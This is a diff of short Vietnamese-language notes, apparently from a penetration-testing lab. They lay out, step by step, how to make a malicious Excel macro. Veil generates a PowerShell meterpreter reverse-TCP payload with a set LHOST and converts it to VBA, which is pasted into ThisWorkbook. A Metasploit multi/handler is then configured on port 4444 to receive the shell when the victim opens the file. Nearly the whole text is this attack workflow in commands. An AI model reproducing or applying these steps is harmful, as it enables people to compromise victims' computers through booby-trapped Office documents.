@@ -1,26 +1,28 @@
 Macro Excel
- 
+  1. File >> 2. Option >> 3. Customize Ribbon >> 4. Customize The Ribbon >> 5. Developer >> ok
+
 Mở Veil
 Lệnh: veil
  
-use 1
+ 1. use 1
  
-list
+ 2. list
  
-use 22
-powershell/meterpreter/rev_tcp>>]: set LHOST 192.168.74.164
-[powershell/meterpreter/rev_tcp>>]: generate
+ 3. use 22
+   powershell/meterpreter/rev_tcp>>]: set LHOST 192.168.74.164
+   [powershell/meterpreter/rev_tcp>>]: generate
  
  
-Copy đường dẫn file .bat
+ 4. Copy đường dẫn file .bat
  
-Convert sang macro sử dụng payload 3
-use 3
+ 5. Convert sang macro sử dụng payload 3
+
+ 6. use 3
  
-[auxuliary/macro_converter>>]: set ARCHITECTURE x64
-[auxuliary/macro_converter>>]: set POSH_BATCH /var/lib/veil/output/source/a.bat
+  [auxuliary/macro_converter>>]: set ARCHITECTURE x64
+  [auxuliary/macro_converter>>]: set POSH_BATCH /var/lib/veil/output/source/a.bat
  
-Đặt tên
+7. Đặt tên
  
  
 Copy lấy đường dẫn để truy vấn vào file b.txt cho dễ
@@ -33,8 +35,9 @@ Copy mã độc vào thisWorkbook
  
  
  
- 
-msf6 > use exploit/multi/handler 
+(Kali)
+1. msfconsole
+2. msf6 > use exploit/multi/handler 
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
 payload => windows/meterpreter/reverse_tcp
@@ -44,7 +47,6 @@ msf6 exploit(multi/handler) > set lport 4444
 lport => 4444
 msf6 exploit(multi/handler) > exploit
  
-Sau khi chạy file Excel
  
 
 
